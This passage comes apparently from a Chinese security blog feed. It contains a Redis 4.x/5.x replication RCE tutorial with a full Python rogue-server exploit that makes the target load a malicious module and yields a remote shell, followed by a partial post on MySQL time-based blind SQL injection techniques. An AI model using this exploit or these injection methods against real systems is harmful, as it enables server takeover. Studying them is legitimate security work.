punctuation">,</span>reverse_port<span class="token punctuation">)</span>filename<span class="token operator">=</span><span class="token string">"root"</span>path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span></code></pre><p>生成一波，尝试反弹shell<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174818-57eaa354-a553-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174721-35fd0ebc-a553-1.png" alt="image.png"></p><p>成功反弹shell</p><h1 id="Redis4-x-5-x从SSRF到RCE"><a href="#Redis4-x-5-x从SSRF到RCE" class="headerlink" title="Redis4.x/5.x从SSRF到RCE"></a>Redis4.x/5.x从SSRF到RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天看到RR师傅在朋友圈发的redis4.x/5.x rce，原本想去搞搞看的，但是无奈本菜鸡正处于考试预习阶段QAQ，所以没什么心思去看 =。=，直到考完试才安心下来看，不过网上已经很多关于redis rce分析的文章，但是我发现大多数都是一笔带过没怎么看懂（我理解能力比较差），所以决定自己搞一下。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>利用条件：</p><ul><li>能未授权或者能通过弱口令认证访问到Redis服务器</li></ul><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制的概述：</p><pre><code>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712203930-18130eb2-a4a2-1.png" alt="image.png"></p><p>建立主从复制，有3种方式：</p><ol><li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li><li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li><li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li></ol><p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p><p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380</p><pre class=" language-sh"><code class="language-sh">redis-server /etc/redis/redis.confredis-server /etc/redis/redis6380.conf</code></pre><p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code></p><pre class=" language-sh"><code class="language-sh">root@kali:/usr/bin# redis-cli -p 6379127.0.0.1:6379> SLAVEOF 127.0.0.1 6380OK127.0.0.1:6379> get test(nil)127.0.0.1:6379> exitroot@kali:/usr/bin# redis-cli -p 6380127.0.0.1:6380> get test(nil)127.0.0.1:6380> set test "test"OK127.0.0.1:6380> get test"test"127.0.0.1:6380> exitroot@kali:/usr/bin# redis-cli -p 6379127.0.0.1:6379> get test"test"</code></pre><p>执行一波，我们可以明显看到数据达到了同步的效果.<br>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p><h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p><p>恶意so文件编写：<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" title="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用步骤，贴一下PPT上的步骤</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712235651-a9a794c2-a4bd-1.png" alt="image.png"><br>slave和master的握手协议过程</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713002514-a0feb180-a4c1-1.png" alt="image.png"><br>图中一些常量说明</p><pre><code>#define REPL_STATE_CONNECTING 2 /* 等待和master连接 *//* --- 握手状态开始 --- */#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 *//* --- 握手状态结束 --- */#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */</code></pre><p>我这里主要讲一下最重要的那一步，就是利用全量复制将master上的<code>RDB</code>文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p><p>那我们为什么一定要用全量复制呢？原因如下。<br>当slave向master发送<code>PSYNC</code>命令之后，一般会得到三种回复：</p><ol><li>+FULLRESYNC：进行全量复制。</li><li>+CONTINUE：进行增量同步。</li><li>-ERR：当前master还不支持PSYNC。</li></ol><p><strong>全量复制的过程：</strong></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004119-dfd75b44-a4c3-1.png" alt="image.png"></p><ul><li>slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为<code>?</code>，offest为<code>-1</code>，我们来测试以下看看是不是真的如此</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713004651-a59d01da-a4c4-1.png" alt="image.png"></p><ul><li><p>master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制，slave并对master发来的runid和offest进行保存</p></li><li><p>master把自己的runid和offset发给slave</p></li><li><p>master进行bgsave，生成RDB文件</p></li><li><p>master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave</p></li><li><p>slave加载RDB文件和缓冲区数据</p></li></ul><p><strong>增量复制（又称部分复制）过程：</strong></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713005510-cf74b1aa-a4c5-1.png" alt="image.png"></p><p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p><p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ul><li>配置一个我们需要以master身份给slave传输so文件的服务，大致流程如下<pre><code>PING 测试连接是否可用+PONG 告诉slave连接可用REPLCONF 发送REPLCONF信息，主要是当前实例监听端口+OK 告诉slave成功接受REPLCONF 发送REPLCONF capa+OK 告诉slave成功接受PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC</code></pre>如下图所示：</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713014728-1d6e49a0-a4cd-1.png" alt="image.png"></p><ul><li>将要攻击的redis服务器设置成我们的slave</li></ul><pre><code>SLAVEOF ip port</code></pre><ul><li>设置RDB文件<br>PS:这里注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用<code>config set dir path</code></li></ul><pre><code>config set dbfilename exp.so</code></pre><ul><li>告诉slave使用全量复制并从我们配置的Rouge Server接收module<pre><code>+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;</code></pre>PS：其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>贴一下exp，写得比较丑，为了节省文章的篇幅其它功能我就没有加上去了，有需要的师傅可以自行添加=。=</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> timeCRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>payload<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"exp.so"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>exp_filename<span class="token operator">=</span><span class="token string">"exp.so"</span><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> CRLF    <span class="token keyword">global</span> payload    redis_arr<span class="token operator">=</span>arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">=</span><span class="token string">""</span>    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x    cmd<span class="token operator">+=</span>CRLF    <span class="token keyword">return</span> cmd<span class="token keyword">def</span> <span class="token function">redis_connect</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> sock<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">interact_shell</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> flag<span class="token punctuation">:</span>            shell<span class="token operator">=</span>raw_input<span class="token punctuation">(</span><span class="token string">"\033[1;32;40m[*]\033[0m "</span><span class="token punctuation">)</span>            shell<span class="token operator">=</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> shell<span class="token operator">==</span><span class="token string">"exit"</span> <span class="token operator">or</span> shell<span class="token operator">==</span><span class="token string">"quit"</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token boolean">False</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                send<span class="token punctuation">(</span>sock<span class="token punctuation">,</span><span class="token string">"system.exec {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">RogueServer</span><span class="token punctuation">(</span>lport<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> CRLF    <span class="token keyword">global</span> payload    flag<span class="token operator">=</span><span class="token boolean">True</span>    result<span class="token operator">=</span><span class="token string">""</span>    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    clientSock<span class="token punctuation">,</span> address <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> flag<span class="token punctuation">:</span>        data <span class="token operator">=</span> clientSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"PING"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            result<span class="token operator">=</span><span class="token string">"+PONG"</span><span class="token operator">+</span>CRLF            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token boolean">True</span>        <span class="token keyword">elif</span> <span class="token string">"REPLCONF"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            result<span class="token operator">=</span><span class="token string">"+OK"</span><span class="token operator">+</span>CRLF            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token boolean">True</span>        <span class="token keyword">elif</span> <span class="token string">"PSYNC"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"SYNC"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            result <span class="token operator">=</span> <span class="token string">"+FULLRESYNC "</span> <span class="token operator">+</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">" 1"</span> <span class="token operator">+</span> CRLF            result <span class="token operator">+=</span> <span class="token string">"$"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CRLF            result <span class="token operator">=</span> result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            result <span class="token operator">+=</span> payload            result <span class="token operator">+=</span> CRLF            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token boolean">False</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    lhost<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>    lport<span class="token operator">=</span><span class="token number">6666</span>    rhost<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>    rport<span class="token operator">=</span><span class="token number">6379</span>    passwd<span class="token operator">=</span><span class="token string">""</span>    redis_sock<span class="token operator">=</span>redis_connect<span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span>    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>        send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"SLAVEOF {} {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>lhost<span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    RogueServer<span class="token punctuation">(</span>lport<span class="token punctuation">)</span>    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"MODULE LOAD ./{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>    interact_shell<span class="token punctuation">(</span>redis_sock<span class="token punctuation">)</span></code></pre><p>效果图</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712154011-4783cdd2-a478-1.png" alt="image.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://redis.io/topics/protocol" title="https://redis.io/topics/protocol" target="_blank" rel="noopener">https://redis.io/topics/protocol</a><br><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t1" title="https://www.cnblogs.com/kismetv/p/9236731.html#t1" target="_blank" rel="noopener">https://www.cnblogs.com/kismetv/p/9236731.html#t1</a><br><a href="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" title="http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://duqingfeng.net/2018/06/08/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E2%80%94%E2%80%94%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E4%B8%8E%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E6%80%BB%E7%BB%93/</a><br><a href="https://www.cnblogs.com/hongmoshui/p/10594639.html" title="https://www.cnblogs.com/hongmoshui/p/10594639.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongmoshui/p/10594639.html</a><br><a href="https://xz.aliyun.com/t/5616" title="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">https://xz.aliyun.com/t/5616</a><br><a href="https://joychou.org/web/hackredis-enhanced-edition-script.html" title="https://joychou.org/web/hackredis-enhanced-edition-script.html" target="_blank" rel="noopener">https://joychou.org/web/hackredis-enhanced-edition-script.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL中延时注入的5种姿势</title>
      <link href="/2019/06/26/mysql%E4%B8%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%845%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
      <url>/2019/06/26/mysql%E4%B8%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%845%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>延时注入无论是在实战中还是在CTF中还是比较常见的，下面我总结一下延时注入的一些套路</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>最简单直接准确的方式是用<code>sleep</code></p><pre><code>mysql&gt; select sleep(5);+----------+| sleep(5) |+----------+|        0 |+----------+1 row in set (5.00 sec)</code></pre><h2 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h2><p>通过执行多次表达式，以达到延时的效果。</p><pre><code>mysql&gt; select benchmark(10000000,md5(1));+----------------------------+| benchmark(10000000,md5(1)) |+----------------------------+|                          0 |+----------------------------+1 row in set (2.20 sec)</code></pre><h2 id="reDos"><a href="#reDos" class="headerlink" title="reDos"></a>reDos</h2><blockquote><p>利用正则表达式的回溯机制</p></blockquote><h3 id="正则表达式的两种引擎"><a href="#正则表达式的两种引擎" class="headerlink" title="正则表达式的两种引擎"></a>正则表达式的两种引擎</h3><p>正则表达式的常见引擎可以大致分为两种：</p><ol><li>DFA（确定型有穷自动机）</li><li>NFA（非确定型有穷自动机）</li></ol><p>特点</p><pre><code>DFA的特点是只对字符串扫描一次，并且会保证返回一个目标字符串里面的最长匹配，不支持字符串进行回溯NFA最大的特点是回溯机制，会对字符串进行多次扫描匹配</code></pre><p>他们匹配的过程为:</p><ul><li>DFA：用字符串去匹配正表达式，从开始状态一个一个去匹配字符，如果字符匹配正确就会吞入这字符，如果匹配不上则会吐出这个字符，然后继续往下匹配，直到正则表达式全部匹配完成或者匹配失败</li><li>NFA：用正则表达式去匹配字符，每吞入一个字符就会和正则表达式做比较，如果匹配正确就会继续往下匹配，如果匹配失败，则会进行回溯，尝试其它状态，直到正则表达式全部匹配完成或者匹配失败</li></ul><p>由于<code>NFA</code>存在回溯机制，所以<code>NFA</code>效率会低于<code>DFA</code>，但是<code>NFA</code>的功能却比<code>DFA</code>的多，所以现在大多数编程语言中都是使用<code>NFA</code>作为正则引擎。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>我们用一个这样子的正则表达式<code>&lt;a&gt;(.*)&lt;/a&gt;</code>去匹配<code>&lt;a&gt;testtesttest&lt;/a&gt;</code>，这个正表达式一上来就匹配到了<code>&lt;a&gt;</code>，到后面由于<code>（.*）</code>（贪婪模式）的存在，正则引擎会着急地吞掉后面的所有字符，不过由于该正则表达式还有要匹配的内容即<code>&lt;/a&gt;</code>，所以正则表达式会尝试匹配<code>&lt;</code>，它在字符串末尾匹配不成功，所以它每次回溯一个字符，继续尝试匹配<code>&lt;</code>，直到匹配到<code>&lt;/a&gt;</code>的<code>&lt;</code>，然后它再继续匹配<code>/</code>，以此类推下去。</p><p>图为正则表达式的执行过程，可以明显发现该正则表达式回溯了4次。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627131932-259b5412-989b-1.gif" alt=""></p><p>如果正则表达式的回溯次数过多时候，就会占用服务器大量的资源从而造成<code>reDos</code>的情况。</p><h3 id="小试一波"><a href="#小试一波" class="headerlink" title="小试一波"></a>小试一波</h3><p>———————————————————–分割线——————————————————————————————–</p><p>2019/6/28更新，我之前一直以为mysql的<code>reDos</code>是因为它的正则引擎是<code>nfa</code>，但是通过查了一波资料和本地操作，发现并不是这样子的，mysql并没有回溯，而是由于填充了大量的字符和大量的<code>pattern</code>，导致mysql消耗大量的资源从而出现延时的情况，我们用<code>php</code>和<code>mysql</code>对比一下就知道了，用同样的正则表达式，php延时了，而mysql并没有延时。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190629073909-eccc5744-99fd-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190629073922-f49c7404-99fd-1.png" alt="image.png"></p><p>———————————————————–分割线——————————————————————————————–<br>那我们在mysql中尝试一波吧。</p><pre><code>mysql&gt; select rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b');+-----------------------------------------------------------------+| rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b') |+-----------------------------------------------------------------+|                                                            NULL |+-----------------------------------------------------------------+1 row in set, 1 warning (0.00 sec)</code></pre><p>但是我们发现并没有延时，细心的同学可能会发现那个有一个<code>warning</code>，我们把警告打开一下看看是哪里出问题了。</p><pre><code>mysql&gt; \WShow warnings enabled.mysql&gt; select rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b');+-----------------------------------------------------------------+| rpad('a',10000000,'a') regexp concat(repeat('(a.*)+',1000),'b') |+-----------------------------------------------------------------+|                                                            NULL |+-----------------------------------------------------------------+1 row in set, 1 warning (0.00 sec)Warning (Code 1301): Result of rpad() was larger than max_allowed_packet (1048576) - truncated</code></pre><p>发现是<code>mysql</code>设置允许接受的最大数据包大小是<code>1M</code>，而我们上面填充的字符明显超过了<code>1M</code>，所以会出现一个<code>warning</code>。</p><pre><code>mysql&gt; show VARIABLES like 'max_allowed_packet';+--------------------+---------+| Variable_name      | Value   |+--------------------+---------+| max_allowed_packet | 1048576 |+--------------------+---------+1 row in set, 1 warning (0.00 sec)</code></pre><p>然后我们我要匹配把字符改小一点尝试一波，可以明显地发现延时了3.29秒</p><pre><code>mysql&gt; select rpad('a',100000,'a') regexp concat(repeat('(a.*)+',1000),'b');+---------------------------------------------------------------+| rpad('a',100000,'a') regexp concat(repeat('(a.*)+',1000),'b') |+---------------------------------------------------------------+|                                                             0 |+---------------------------------------------------------------+1 row in set (3.29 sec)</code></pre><p>或者我们也可以把<code>max_allowed_packet</code>改大一点</p><pre><code>mysql&gt; set global max_allowed_packet = 20*1024*1024;Query OK, 0 rows affected (0.00 sec)...中间省略...mysql&gt; select rpad('a',1000000,'a') regexp concat(repeat('(a.*)+',1000),'b');+----------------------------------------------------------------+| rpad('a',1000000,'a') regexp concat(repeat('(a.*)+',1000),'b') |+----------------------------------------------------------------+|                                                              0 |+----------------------------------------------------------------+1 row in set (31.99 sec)</code></pre><p>成功延时了31秒。</p><h2 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>笛卡儿积（来自百度百科）</p><pre><code>笛卡尔乘积是指在数学中，两个集合X和Y的笛卡尓积（Cartesian product），又称直积，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员</code></pre><p>举个例子</p><pre><code>假设集合A={a, b}，集合B={0, 1, 2}，那么这两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</code></pre><p>在mysql中如果多表查询使用不恰当时就会出现笛卡儿积现象，在多表查询中如果两张或者多张表的数据量都比较大的话，就会占用很大空间资源从而出现延时的情况。</p><h3 id="小试一波-1"><a href="#小试一波-1" class="headerlink" title="小试一波"></a>小试一波</h3><p>既然我们已经了解笛卡尔积会造成占用大量资源的情况，那我们现在mysql来尝试一波吧。</p><pre><code>mysql&gt; select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C;+----------+| count(*) |+----------+| 80621568 |+----------+1 row in set (3.39 sec)</code></pre><p>可以很明显地看到延时了3s，我们还可以延时更久</p><pre><code>mysql&gt; select count(*) from information_schema.tables A, information_schema.tables B,information_schema.columns C;+-----------+| count(*)  |+-----------+| 891689472 |+-----------+1 row in set (36.99 sec)</code></pre><h2 id="利用mysql的共享锁"><a href="#利用mysql的共享锁" class="headerlink" title="利用mysql的共享锁"></a>利用mysql的共享锁</h2><h3 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h3><p>先来看一波<code>get_lock</code>的语法</p><pre><code>get_lock(key, timeout)</code></pre><p><code>get_lock</code>会按照<code>key</code>来加锁，当其它的客户端（session）再以同样的<code>key</code>加锁时就会处于等待状态，如果在等待期间（timeout）内获取到锁，则返回1；如果在timeout时间后获取不到锁，则返回0；如果发生错误，则返回一个<code>NULL</code>。</p><h3 id="mysql-pconnect"><a href="#mysql-pconnect" class="headerlink" title="mysql_pconnect"></a>mysql_pconnect</h3><p>不过这种方法比较局限，在<code>php</code>中它必须用<code>mysql_pconnect()</code>函数连接数据库才可以</p><p><code>mysql_pconnect</code>的定义（来自<code>w3cschool</code>）</p><pre><code>mysql_pconnect() 函数打开一个到 MySQL 服务器的持久连接。</code></pre><p><code>mysql_pconnect()</code>和 <code>mysql_connect()</code>非常相似，但有两个主要区别：</p><pre><code>1. 当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。2. 其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。</code></pre><h3 id="小试一波-2"><a href="#小试一波-2" class="headerlink" title="小试一波"></a>小试一波</h3><p>session A</p><pre><code>mysql&gt; select get_lock("test",5);+--------------------+| get_lock("test",5) |+--------------------+|                  1 |+--------------------+1 row in set (0.00 sec)</code></pre><p>session B</p><pre><code>mysql&gt; select get_lock("test",5);+--------------------+| get_lock("test",5) |+--------------------+|                  0 |+--------------------+1 row in set (5.00 sec)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190627122236-311119b0-9893-1.png" 